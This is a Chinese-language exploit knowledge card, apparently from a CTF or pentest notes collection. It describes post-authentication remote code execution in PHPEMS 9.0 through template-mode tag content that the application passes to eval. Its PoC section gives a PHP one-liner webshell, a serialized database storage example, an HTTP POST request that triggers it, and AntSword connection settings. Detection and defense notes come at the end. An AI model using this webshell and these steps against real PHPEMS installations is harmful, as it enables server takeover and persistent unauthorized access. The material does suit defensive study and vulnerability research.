---
id: web-php-rce-phpems-block-tag-template-eval
title: PHPEMS 后台标签"模板模式"内容 getshell：blockcontent 序列化存入 x2_block，渲染时 stripSlashes+html_entity_decode 后拼进 eval
type: scenario
domain: web
path: web/php/rce
technique: phpems-block-tag-template-eval
aliases:
- PHPEMS 标签管理 getshell
- 模板模式 eval
- blockcontent 序列化
- PHPEMS 后台 RCE
- 注册协议一句话
- user-app-register eval
tags:
- php
- phpems
- rce
- eval
- template
- stored
- backend
- webshell
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V564
  verified_at: '2026-11-12T07:54:10+08:00'
  notes: 已对照原文与25张图片逐张核对：后台PHPEMS9.0标签管理ID1注册协议/注册页面/模板模式、内容写入<?php namespace t;@eval(_POST[1]);?>、x2_block.blockcontent序列化存储（截图为HTML转义形式s:43:&lt;?php...?&gt;，验证时已把卡内DB示例由未转义改为截图所示的转义形式）、api.cls.php blocktype==4时html_entity_decode(stripSlashes(blockcontent))→fetchContent→eval(' ?>'..'<?php ')、注册页模板exeBlock('1')、AntSword base64连接user-app-register成功，均与正文/截图一致；未复跑；需要后台会话的前置链见同篇卡web-php-deserialization-custom-session-cookie-known-plaintext-key-forge-sqli；affected_versions 原文未标注（PHPEMS9.0为题目环境标识），未设置。
---

## 一句话结论

PHPEMS 9.0 后台「内容 → 标签管理」允许把标签类型设为「模板模式」并编辑内容：内容被 `serialize` 存进 `x2_block.blockcontent`，前台渲染时 `app/content/cls/api.cls.php` 对 `blocktype == 4` 取出该字段，经 `html_entity_decode`/`stripSlashes` 后 `$tp = tpl->fetchContent(...)`，再执行 `eval(' ?>'.$tp.'<?php ')`——在后台写入 `<?php namespace t;@eval($_POST[1]);?>` 后访问 `/index.php?user-app-register` 即执行任意 PHP，可直接用 AntSword 连接。

## 原理

- **存储路径**：后台标签管理修改标签（如 ID 1、名称"注册协议"、位置"注册页面"、类型"模板模式"）时，内容以序列化形式写入 `x2_block.blockcontent`，例如 `a:1:{s:7:"content";s:43:"&lt;?php namespace t;@eval($_POST[1]);?&gt;";}`。
- **渲染路径**：`app/content/cls/api.cls.php` 处理模板模式标签时，取 `$block['blockcontent']`，先 `html_entity_decode($this->ev->stripSlashes(...))`，再 `$tp = $this->tpl->fetchContent(...)`，最后 `eval(' ?>'.$tp.'<?php ')`。`fetchContent` 只做模板片段读取，真正执行来自 `eval`。
- **为什么必然 RCE**：`eval` 会把标签内容里的 `<?php ... ?>` 当作 PHP 执行；后台标签编辑是合法功能，但服务端没有限制内容中的 PHP 代码/危险函数，等价于"管理员可编辑任意 PHP 模板"——在 PHP 应用里这就是 RCE 权限。
- **与 unserialize 的关系**：`blockcontent` 是序列化存储，读取时反序列化取 `content` 字段；对象注入不是本链的必要条件（内容本身即可控），但同一份数据同时承担"存储格式"和"代码载荷"。
- **前置**：需要后台管理员会话。原文的完整题目链是先通过 session Cookie 伪造 + 对象注入 SQLi 改掉 `peadmin` 密码进入后台，再走本条标签编辑 getshell。

## 触发条件

- 攻击者拥有 PHPEMS 后台管理员会话（弱口令、或经其他漏洞改密/绕过后台认证）。
- 后台「标签管理」可编辑标签，且类型可选「模板模式」。
- 标签绑定在可匿名/可访问页面（原文 ID 1 为注册页面的注册协议，访问 `/index.php?user-app-register` 触发渲染）。
- 服务端对标签内容未做转义、未禁用 `eval`。

## 利用步骤

1. 登录后台，进入「内容」→「标签管理」，找到 ID 1（注册协议/注册页面）或新建模板模式标签。
2. 将类型设为「模板模式」，内容写入一句话：
   `<?php namespace t;@eval($_POST[1]);?>`
3. 保存后确认数据库 `x2_block.blockcontent` 已序列化存储该内容。
4. 前台访问 `/index.php?user-app-register`，页面渲染该标签时执行 `eval`。
5. 用 AntSword 连接 URL，编码器选 base64，密码 `1`，执行命令。

## PoC

```php
// 标签内容（后台输入框）
<?php namespace t;@eval($_POST[1]);?>
```

```text
数据库存储示例（x2_block）：
blockid=1, block=注册协议, blocktype=4(模板模式), blockposition=注册页面,
blockcontent=a:1:{s:7:"content";s:43:"&lt;?php namespace t;@eval($_POST[1]);?&gt;";}
```

```http
POST /index.php?user-app-register HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

1=phpinfo();
```

## 变体与关联

- 同链前置：[[web-php-deserialization-custom-session-cookie-known-plaintext-key-forge-sqli]]（PHPEMS 伪造 session → SQL 注入改管理员密码，进入后台后再用本卡 getshell）。
- 同类后台模板/标签 eval：[[web-php-rce-foxcms-taglib-id-code-injection]]、[[web-php-rce-dedecms-field-tag-runphp-stored-injection]]、[[web-php-rce-dedecms-template-tag-source-substr-replace-waf-bypass]]（同为 CMS 标签/模板内容落库后执行）。
- 变体：其他 `blocktype`（如内容模式/HTML 模式）若同样走 `fetchContent`+`eval`，也可用；标签位置选高频页面（首页/注册/登录）提高触发稳定性。
- 边界：服务端对标签内容做 HTML 转义/禁用 `eval`、模板引擎白名单、后台无标签编辑权限、标签未被页面引用时，本链失效。

## 检测与防御

- **检测**：`x2_block.blockcontent` 出现 `<?php`/`eval(`/`$_POST` 等特征；后台标签编辑操作与随后的前台请求；webshell 连接流量（AntSword base64 编码）。
- **防御**：移除对数据库内容的 `eval`，改用沙箱化模板引擎（变量替换/白名单标签）；标签内容保存时过滤 `<?php` 与危险函数；后台敏感操作二次认证与审计；最小权限运行 PHP。
